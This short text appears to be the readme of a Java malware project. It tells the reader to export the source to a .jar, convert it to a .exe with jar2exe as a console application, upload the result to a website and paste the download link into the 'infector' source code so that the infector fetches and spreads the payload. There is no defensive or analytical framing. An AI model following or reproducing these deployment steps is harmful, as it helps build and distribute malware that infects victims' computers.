-There are very important steps to make this work correctly.
-After this source code is exported to a .jar file, you must covert it to a .exe file.
-To do this use jar2exe - http://www.jar2exe.com/
-This will convert the .jar to a .exe, hence the name.
-When you first run jar2exe and select the jar, select Console Application as what type of application to create.
-Then leave everything else how it is.
-Once it is compiled to a .exe, you will need to upload this file to a site and place the download link inside the infector source code.
